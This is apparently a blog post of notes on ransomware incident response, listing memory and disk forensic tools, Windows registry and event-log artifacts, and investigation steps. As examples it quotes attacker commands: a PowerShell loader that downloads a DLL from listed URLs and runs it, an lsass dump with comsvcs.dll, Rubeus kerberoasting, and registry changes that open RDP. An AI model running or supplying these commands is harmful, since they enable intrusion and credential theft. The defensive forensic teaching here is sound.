@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="en" data-theme=""><head>
+    <title> Ewiniar | Incident Response for Ransomware Attacks </title>
+    <meta charset="utf-8"><meta name="generator" content="Hugo 0.98.0" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <meta name="description" content="Call me Ewiniar">
+    
+    <link rel="stylesheet" href="https://ewiniar.github.io/css/style.min.3a5b6eae22d121cb3fa356aa69e3265d1fe37c6f6682455cb3327ad3930b2d59.css" integrity="sha256-OlturiLRIcs/o1aqaeMmXR/jfG9mgkVcszJ605MLLVk=" crossorigin="anonymous" type="text/css"><link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+    
+    <link rel="shortcut icon" href="https://ewiniar.github.io/favicons/favicon.ico" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://ewiniar.github.io/favicons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://ewiniar.github.io/favicons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://ewiniar.github.io/favicons/favicon-16x16.png">
+    <link rel="canonical" href="https://ewiniar.github.io/post/incident.response.for.ransomware.attacks/">
+    
+    
+    <script type="text/javascript" src="https://ewiniar.github.io/js/anatole-header.min.c03789895b317d6ebb46e8e20d76f0db48f181ce83dd24952b124194c9bb0fe3.js" integrity="sha256-wDeJiVsxfW67RujiDXbw20jxgc6D3SSVKxJBlMm7D&#43;M=" crossorigin="anonymous"></script>
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Incident Response for Ransomware Attacks"/>
+<meta name="twitter:description" content="Volatile memory collection and analysis   AccessData FTK Imager"/>
+
+</head><body><div class="sidebar animated fadeInDown">
+    <div class="logo-title">
+      <div class="title">
+        <img src="https://ewiniar.github.io/images/profile.jpg" alt="profile picture">
+        <h3 title=""><a href="/">I&#39;m Ewiniar</a></h3>
+        <div class="description">
+          <p>Call me Ewiniar</p>
+        </div>
+      </div>
+    </div>
+    <ul class="social-links">
+        
+        <li>
+        <a href="https://twitter.com/Ewiniarin" rel="me" aria-label="Twitter">
+          <i class="fa fa-2x fa-twitter" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="https://github.com/ewiniar/" rel="me" aria-label="GitHub">
+          <i class="fa fa-2x fa-github" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="" rel="me" aria-label="instagram">
+          <i class="fa fa-2x fa-instagram" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+        <li>
+        <a href="mailto:ewiniar@gmail.com" rel="me" aria-label="e-mail">
+          <i class="fa fa-2x fa-envelope" aria-hidden="true"></i>
+        </a>          
+        </li>
+
+        
+    </ul>
+    <div class="footer">
+        <div class="by_farbox">&copy; Ewiniar 2022 </div>
+      </div>
+    </div>
+</div><div class="main">
+            <div class="page-top animated fadeInDown">
+    <a role="button" class="navbar-burger" data-target="navMenu" aria-label="menu" aria-expanded="false" >
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+        <span aria-hidden="true"></span>
+      </a>
+    <ul class="nav" id="navMenu">
+        
+        
+        
+        <li><a  href="/" title="">Home</a></li>
+        
+        
+        <li><a  href="/post/" title="">Posts</a></li>
+        
+        
+        <li><a  href="/about/" title="">About</a></li>
+        
+        
+        <li class="theme-switch-item">
+        <a class="theme-switch" title="Switch Theme">
+            <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+        </a>
+        </li>
+    </ul>
+</div>
+
+            <div class="autopagerize_page_element">
+                <div class="content">
+<div class="post animated fadeInDown">
+    <div class="post-content">
+
+      <div class="post-title">
+        <h3>Incident Response for Ransomware Attacks
+        </h3>
+        
+        <div class="info">
+          <i class="fa fa-sun-o"></i>
+          <span class="date">Thu, May 12, 2022</span>
+          <i class="fa fa-clock-o"></i><span class="reading-time">10-minute read</span>
+        </div>
+        
+        </div>
+
+    <h2 id="volatile-memory-collection-and-analysis">Volatile memory collection and analysis</h2>
+<ul>
+<li>
+<p><a href="https://accessdata.com/product-download/ftk-imager-version-4-5">AccessData FTK Imager</a></p>
+</li>
+<li>
+<p><a href="https://belkasoft.com/ram-capturer">Belkasoft RAM Capturer</a></p>
+</li>
+<li>
+<p><a href="https://www.magnetforensics.com/resources/magnet-ram-capture/">Magnet RAM Capturer</a></p>
+</li>
+</ul>
+<blockquote>
+<p>Once you created a memory dump, its ready to be analyzed. A very common tool for
+memory dumps analysis is Volatility – an open source framework for memory forensics.
+Currently, there are two versions of the tool:</p>
+</blockquote>
+<ul>
+<li>
+<p><a href="https://www.volatilityfoundation.org/releases">Volatility 2</a></p>
+</li>
+<li>
+<p><a href="https://www.volatilityfoundation.org/releases-vol3">Volatility 3</a></p>
+</li>
+</ul>
+<h3 id="there-are-tools-that-enable-an-incident-responder-to-perform-live-analysis">There are tools that enable an incident responder to perform live analysis.</h3>
+<ul>
+<li>
+<p>Process Hacker</p>
+</li>
+<li>
+<p>pagefile.sys</p>
+<p>This file can be analyzed using  <a href="https://github.com/matonis/page_brute">page_brute</a>.</p>
+</li>
+<li>
+<p>hiberfil.sys</p>
+<p>This is a Windows hibernation file, which is stored in the system</p>
+</li>
+</ul>
+<blockquote>
+<p>root as well and is used to save the machine state in case of hibernation. This file
+can be converted using the imagecopy Volatility plugin, and then analyzed like a
+regular memory dump using the same tool.</p>
+</blockquote>
+<h2 id="non-volatile-data-collection">Non-volatile data collection</h2>
+<ul>
+<li>
+<p>A pretty good tool for collecting triage data is Live Response Collection by Brian Moran
+<a href="https://www.brimorlabs.com/Tools/LiveResponseCollection-Cedarpelta.zip">https://www.brimorlabs.com/Tools/LiveResponseCollection-Cedarpelta.zip</a></p>
+<p><em><strong>Just dont forget to run it from an external drive or a network share.</strong></em></p>
+</li>
+<li>
+<p>Kroll Artifact Parser and Extractor (KAPE)</p>
+</li>
+<li>
+<p>A good opensource example is <a href="https://github.com/Velocidex/velociraptor">Velociraptor</a>.</p>
+</li>
+</ul>
+<h2 id="master-file-table">Master file table</h2>
+<ul>
+<li><a href="https://ericzimmerman.github.io/#!index.md">https://ericzimmerman.github.io/#!index.md</a></li>
+</ul>
+<h2 id="prefetch-files">Prefetch files</h2>
+<ul>
+<li>Prefetch files can be parsed with PECmd</li>
+</ul>
+<h2 id="lnk-files">LNK files</h2>
+<ul>
+<li>theres a tool for parsing such files, LECmd</li>
+</ul>
+<h2 id="jump-lists">Jump lists</h2>
+<ul>
+<li>Theres a GUI tool for browsing the contents of such files – JumpList Explorer</li>
+</ul>
+<h2 id="srum">SRUM</h2>
+<blockquote>
+<p>This Windows feature is used to monitor system performance and can provide an incident
+responder with information on how much data was sent/received per application per
+hour, which is crucial for data exfiltration investigations.
+The database with SRUM data is located at C:\Windows\System32\SRU .
+To parse it properly, you may also need the SOFTWARE registry file,
+located under C:\Windows\System32\config</p>
+</blockquote>
+<ul>
+<li>Both of these files can be parsed with help of SrumECmd. The resulting files can be
+browsed with Timeline Explorer</li>
+</ul>
+<h2 id="web-browsers">Web browsers</h2>
+<h3 id="history">History</h3>
+<ul>
+<li>
+<p>Microsoft Edge: C:\Users%USERNAME%\AppData\Local\Microsoft<br>
+Edge\User Data\Default\History</p>
+</li>
+<li>
+<p>Google Chrome: C:\Users%USERNAME%\AppData\Local\Google<br>
+Chrome\User Data\Default\History</p>
+</li>
+<li>
+<p>Mozilla Firefox: C:\Users%USERPNAME%\AppData\Roaming\Mozilla<br>
+Firefox\Profiles&lt;random text&gt;.default\places.sqlite</p>
+</li>
+</ul>
+<h3 id="cookie">Cookie</h3>
+<ul>
+<li>
+<p>Microsoft Edge: C:\Users%USERNAME%\AppData\Local\Microsoft<br>
+Edge\User Data\Default\Cookies</p>
+</li>
+<li>
+<p>Google Chrome: C:\Users%USERNAME%\AppData\Local\Google<br>
+Chrome\User Data\Default\Cookies</p>
+</li>
+<li>
+<p>Mozilla Firefox: C:\Users%USERNAME%\AppData\Roaming\Mozilla<br>
+Firefox\Profiles&lt;randomtext&gt;.default\cookies.sqlite</p>
+</li>
+</ul>
+<h3 id="cache">Cache</h3>
+<ul>
+<li>
+<p>Microsoft Edge: C:\Users%USERNAME%\AppData\Local\Microsoft<br>
+Edge\User Data\Default\Cache</p>
+</li>
+<li>
+<p>Google Chrome: C:\Users%USERNAME%\AppData\Local\Google<br>
+Chrome\User Data\Default\Cache</p>
+</li>
+<li>
+<p>Mozilla Firefox: C:\Users%USERNAME%\AppData\Roaming\Mozilla<br>
+Firefox\Profiles&lt;randomtext&gt;.default\Cache</p>
+</li>
+</ul>
+<p><a href="https://www.nirsoft.net/utils/chrome_cache_view.html">ChromeCacheView</a></p>
+<p><a href="https://www.nirsoft.net/utils/mozilla_cache_viewer.html">MozillaCacheView</a></p>
+<h2 id="windows-registry">Windows Registry</h2>
+<blockquote>
+<p>Lets start with Registry-related file locations. The first three files I want to mention are
+SAM , SYSTEM , and SOFTWARE . These files are located under C:\Windows\System32\config
+The next two files are NTUSER.DAT and USRCLASS.DAT . Theres a copy of both files
+in every user profile, so the first file is located under C:\Users%USERNAME% , and the
+second under C:\Users%USERNAME%\AppData\Local\Microsoft\Windows .
+One more important file, Amcache.hve , is located under C:\Windows\AppCompat\Programs .
+The last registry file I want to mention is Syscache.hve , which is located under the
+C:\System Volume Information folder. Its not very common and is available only
+in Windows 7 and Windows Server 2008 R2 installations, but it can still be very useful, as
+it contains SHA1 hashes for executed binaries.
+Now, lets look at the most common sources of evidence of execution you can find during
+Windows registry file analysis:</p>
+</blockquote>
+<ul>
+<li>
+<p>UserAssist
+( NTUSER.DAT\Software\Microsoft\Windows\Currentversion\Explorer\UserAssist{GUID}\Count ):
+This contains information about GUI-based programs run by the user and includes information
+about run count and last execution date and time.</p>
+</li>
+<li>
+<p>ShimCache
+( SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache ):
+This contains information about executed programs, including their paths, size, and last modification dates.</p>
+</li>
+<li>
+<p>Amcache
+( Amcache.hve\Root\File{Volume GUID}####### ):
+This contains information about executed programs, including their paths, SHA1 hashes,
+and first execution timestamps.  Of course, execution artifacts are not the only digital forensic artifacts you can extract from Windows Registry. Another notable example is artifacts that contain evidence of recently accessed files and folders. Lets look at some of the most common examples:</p>
+</li>
+<li>
+<p>Most Recently Used (MRU)
+( NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU ):
+This contains lists of recently accessed files based on their extensions.</p>
+</li>
+<li>
+<p>Recent files
+( NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs ):
+This acts as another source of information on recently accessed files.</p>
+</li>
+<li>
+<p>Shell bags
+( USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags ):
+This contains the list of recently accessed folders,including network shares and removable devices.</p>
+</li>
+<li>
+<p>you can use Registry Explorer
+– another great tool by Eric Zimmerman
+<a href="https://f001.backblazeb2.com/file/EricZimmermanTools/RegistryExplorer.zip">https://f001.backblazeb2.com/file/EricZimmermanTools/RegistryExplorer.zip</a></p>
+</li>
+<li>
+<p>Another great tool for registry analysis worth mentioning is RegRipper</p>
+<p><a href="https://github.com/keydet89/RegRipper3.0">https://github.com/keydet89/RegRipper3.0</a> by Harlan Carvey</p>
+</li>
+</ul>
+<h2 id="windows-event-logs">Windows event logs</h2>
+<p>Lets look at some commonly used log files and event IDs:</p>
+<ul>
+<li>
+<p>Security:</p>
+<ul>
+<li>4624 – A logon to a system has occurred.</li>
+<li>4625 – A failed logon attempt.</li>
+<li>4720 – A user account was created.</li>
+<li>4732 – A member was added to a security-enabled local group.</li>
+</ul>
+</li>
+<li>
+<p>System:</p>
+<ul>
+<li>7045 – A service was installed by the system.</li>
+<li>7040 – The start type for a service was changed.</li>
+<li>7036 – A service was stopped or started.</li>
+</ul>
+</li>
+<li>
+<p>Windows PowerShell:</p>
+<ul>
+<li>400 – Indicates the start of command execution or session.</li>
+</ul>
+</li>
+<li>
+<p>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational:</p>
+<ul>
+<li>21 – Session logon succeeded.</li>
+<li>24 – Session has been disconnected.</li>
+<li>25 – Session reconnection succeeded.</li>
+</ul>
+</li>
+<li>
+<p>OAlerts:</p>
+<ul>
+<li>300 – An alert generated by Microsoft Office.</li>
+</ul>
+</li>
+<li>
+<p>Microsoft-Windows-TaskScheduler/Operational:</p>
+<ul>
+<li>106 - Scheduled task created.</li>
+<li>200 - Scheduled task executed.</li>
+<li>201 - Scheduled task completed.</li>
+</ul>
+</li>
+<li>
+<p>Microsoft-Windows-Windows-Defender/Operational:
+-1117 – The anti-malware platform performed an action to protect your system
+from malware or other potentially unwanted software.</p>
+</li>
+</ul>
+<h2 id="powershell-example">PowerShell Example</h2>
+<pre tabindex="0"><code>powershell $dfkj=$strs=&#34;http://visteme.mx/shop/wp-admin/PP/,https://newsmag.danielolayinkas.com/content/nVgyRFrTE68Yd9s6/,http://av-quiz.tk/wp-content/k6K/,http://ranvipclub.net/pvhko/a/,https://goodtech.cetxlabs.com/content/5MfZPgP06/,http://devanture.com.sg/wp-includes/XBByNUNWvIEvawb68/,https://team.stagingapps.xyz/wp-content/aPIm2GsjA/&#34;.Split(&#34;,&#34;);foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=&#34;C:\ProgramData\&#34;+$r1+&#34;.dll&#34;;Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=&#34;C:\Windows\SysWow64\rundll32.exe&#34;;$a=$tpth+&#34;,f&#34;+$r2;Start-Process $fp -ArgumentList$a;break;}};;IEX $dfkj
+</code></pre><h2 id="investigate-initial-access-examples">Investigate Initial Access Examples</h2>
+<ul>
+<li>
+<p>We will use Volatility 3 to examine the memory image with malfind plugin;
+We can run the netscan plugin to extract any suspicious network connection.</p>
+</li>
+<li>
+<p>If we look through the collected prefetch files, we can easily spot the one for winword.
+exe . Lets parse it with PECmd and check the referenced files
+we can see a suspicious DOCM file in the temporary folder used by
+Microsoft Outlook; the victim most likely received it via email.</p>
+</li>
+<li>
+<p>We can see that the username is CARPC, so now we can obtain the NTUSER.DAT registry
+file and extract some user-related data with RegRipper.
+First of all, through the analysis of the reading locations registry key, we can see that the
+suspicious DOCM file was opened by the user on November 16, 2021 at 08:49:55 (UTC)</p>
+</li>
+<li>
+<p>under Software\Microsoft\Windows\CurrentVersion\Run with the following data</p>
+</li>
+<li>
+<p>Lets look through the event logs as well. As we already know, the threat actors often
+abuse PowerShell to download payloads from remote servers, so checking the Windows
+PowerShell event log is a must during phishing attack investigations</p>
+</li>
+</ul>
+<h2 id="investigate-post-exploitation">Investigate Post-Exploitation</h2>
+<h3 id="investigate-credential-access">Investigate credential access</h3>
+<ol>
+<li>
+<ul>
+<li>
+<p>so you may have to focus on forensic artifacts showing you evidence of execution, for example, UserAssist, Shimcache, Amcache, Prefetch, and others.</p>
+</li>
+<li>
+<p>Lets try to find any evidence of execution related to credential dumping tools such as
+Mimikatz. Amcache is a very good candidate to solve this task as it contains not only
+execution timestamps, but also metadata and even SHA1 hashes, so we can identify the
+executable even if it was renamed and deleted.</p>
+</li>
+<li>
+<p>For example, we can extract data from Amcache.hve with AmcacheParser.
+checking what metadata is included in its Amcache entry:</p>
+</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>Its high time to look into Windows event logs</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>
+<p>Lets build a $MFT-based timeline using MFTECmd and check this folder for any other
+signs of malicious files.</p>
+</li>
+<li>
+<p>We haven&rsquo;t seen it in AmcacheParser output, but still, there&rsquo;s a prefetch file for it,
+pointing to the fact it was executed</p>
+</li>
+<li>
+<p>Based on the information we collected from $MFT analysis, the file should still exist, so
+we can hash it, for example. If we check the hash on VirusTotal</p>
+</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>Credential dumping with built-in tools</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>a number of ransomware affiliates used comsvcs.dll to dump lsass.exe
+the threat actors abuse rundll32.exe to call the MiniDump exported function of comsvcs.dll</li>
+</ul>
+</li>
+<li>
+<ul>
+<li>
+<p>PowerShell console history files These files are located under %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine . They can be browsed with any text editor</p>
+</li>
+<li>
+<p>Content of history file</p>
+<pre tabindex="0"><code>tasklist
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 556 C:\ProgramData\lsass.dmp full
+cd c:\programdata
+.\Rubeus.exe kerberoast /ldapfilter:admincount=1 / format:hashcat /outfile:C:\Users\Public\hashes.txt
+.\SK.exe
+</code></pre></li>
+</ul>
+</li>
+<li>
+<p>the System Resource Usage Monitor (SRUM).</p>
+</li>
+</ol>
+<blockquote>
+<p>This feature emerged in Windows 8 and collects information about various executables
+and resources they consume, including network traffic and total CPU time. This
+information is stored in an Extensible Storage Engine (ESE) database, which is typically
+located under the C:\Windows\System32\sru in SRUDB.dat file
+We can extract data of interest from this file via, for example, SrumECmd</p>
+</blockquote>
+<h3 id="investigate-reconnaissance">Investigate reconnaissance</h3>
+<ol>
+<li>Network scanning</li>
+</ol>
+<ul>
+<li>
+<p>First, we need to understand where it is located. We already have $MFT parsed, so lets
+start from it. MFT analysis allows you to understand better which artifacts may be useful
+for further investigation and look at the attack from a filesystem perspective.</p>
+</li>
+<li>
+<p>Now we can see that netscan.exe is located under C:\Users\Public . What is more,
+we can see that there is a prefetch file created right after the executable. As you already
+know, it means that the file was executed. But by whom?</p>
+</li>
+<li>
+<p>Lets look at another source of evidence of execution – this time, UserAssist. To extract
+this information, we need to get the NTUSER.dat file and parse it, for example, with
+RegRipper</p>
+</li>
+<li>
+<p>As we parsed the NTUSER.dat file located under C:\Users\smith , we can
+understand that network scanning was performed by the user smith</p>
+</li>
+</ul>
+<ol start="2">
+<li>Active Directory reconnaissance</li>
+</ol>
+<ul>
+<li>AdFind.exe</li>
+</ul>
+<h3 id="investigating-lateral-movement">Investigating lateral movement</h3>
+<ul>
+<li>
+<p>looked into the NTUSER.dat file. Lets look inside it again, this time with
+Registry Explorer to find mountpoint to remote share</p>
+</li>
+<li>
+<p>Lets get the $MFT file from that host and try to understand whether anything was copied to the
+host. Lets parse it with MFTECmd and browse the result in Timeline Explorer.
+Our analysis revealed a very suspicious file in C:\Users\Public – a known staging
+folder used by the threat actors. Lets look inside the file:</p>
+<pre tabindex="0"><code>reg add &#34;HKLM\System\CurrentControlSet\Control\Terminal Server&#34; /v &#34;fDenyTSConnections&#34; /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group=&#34;Remote Desktop&#34; new enable=yes
+reg add &#34;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34; /v &#34;UserAuthentication&#34; /t REG_DWORD /d 0 /f 
+</code></pre><p><em><strong>this file was used by the threat actors to enable RDP connections.</strong></em></p>
+</li>
+<li>
+<p>lets check the SYSTEM registry file the fDenyTSConnections value is 0 , which means
+the threat actors successfully executed the script.</p>
+</li>
+<li>
+<p>look into the Microsoft-Windows-Windows Firewall With Advanced
+Security%4Firewall.evtx event log file and check events with ID 2005
+we can see that firewall rules were also modified, so we can definitely say that a
+malicious script was executed on the target system. But how?</p>
+</li>
+<li>
+<p>Lets keep looking into Windows event logs – this time, System.evtx and event ID 7045</p>
+</li>
+<li>
+<p>Most likely, this tool was executed from the initially compromised host, but still, we need
+to find related evidence. Now we need to look into the Security.evtx event log file
+and look for ID 5140 or 4624 near PsExec execution.</p>
+</li>
+<li>
+<p>There are quite a few sources of artifacts, which may help you to uncover this type
+of activity. One of the most common examples is the Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx event log file. Usually, you will look for events with IDs 21 (Session logon succeeded) and 25 (Session reconnection succeeded). You can also use events with ID 4624 from Security.evtx , focusing on logons with type 10</p>
+</li>
+</ul>
+<h2 id="investigate-data-exfiltration">Investigate Data Exfiltration</h2>
+<h3 id="investigating-web-browser-abuse-for-data-exfiltration">Investigating web browser abuse for data exfiltration</h3>
+<ul>
+<li>
+<p>always check the browsing history for any traces of data exfiltration</p>
+</li>
+<li>
+<p>lets check for any other interesting artifacts parsing $MFT</p>
+</li>
+<li>
+<p>Now lets look inside the prefetch file related</p>
+</li>
+</ul>
+<h3 id="investigating-cloud-service-client-application-abuse-for-data-exfiltration">Investigating cloud service client application abuse for data exfiltration</h3>
+<ul>
+<li>
+<p>it is always a good idea to check for freshly installed programs, which may be related
+to activities performed by the threat actors. Such information can be collected from the
+SOFTWARE registry file, which is located under C:\Windows\System32\config .
+Information about installed programs can be located under SOFTWARE | Microsoft\Windows\CurrentVersion\Uninstall(get programs installation date.)</p>
+</li>
+<li>
+<p>always worth checking the C:\Users%USERNAME%\AppData subfolders for any good sources of evidence</p>
+</li>
+<li>
+<p>Shimcache is one of the most common sources of evidence of execution, so we
+can extract this data from the SYSTEM registry file (located under C:\Windows\System32\config ), for example, via RegRipper, and check for any traces of leveraging masquerading</p>
+<p><strong>The timestamp stored in Shimcache reflects the last modification date of the file, so lets
+review MFT to understand when it was created</strong></p>
+</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+<span class="separator"><a class="category" href="/categories/security/">Security</a></span>
+
+        
+    <span class="separator"><a class="tag" href="/tags/cyber/">Cyber</a><a class="tag" href="/tags/security/">Security</a><a class="tag" href="/tags/network/">Network</a><a class="tag" href="/tags/ransomware/">Ransomware</a><a class="tag" href="/tags/incident-response/">Incident Response</a></span>
+
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+
+
+
+<script type="text/javascript" src="https://ewiniar.github.io/js/jquery.min.bdf872aa3069910fda51fb5296c5320b62bbd82904a801f943b81a61995229a6.js" integrity="sha256-vfhyqjBpkQ/aUftSlsUyC2K72CkEqAH5Q7gaYZlSKaY=" crossorigin="anonymous"></script>
+
+
+
+
+<script type="text/javascript" src="https://ewiniar.github.io/js/bundle.min.c1d1c8b7a17de0ba3c0058c69a129b82fa09091edc5c6990a86748e681b5d8c3.js" integrity="sha256-wdHIt6F94Lo8AFjGmhKbgvoJCR7cXGmQqGdI5oG12MM=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="https://ewiniar.github.io/js/medium-zoom.min.f38354b14e726daea2b656ccc32c944fa1e10a974998cb85bbb50c0f836878b4.js" integrity="sha256-84NUsU5yba6itlbMwyyUT6HhCpdJmMuFu7UMD4NoeLQ=" crossorigin="anonymous"></script></html></body>
+
+</html>
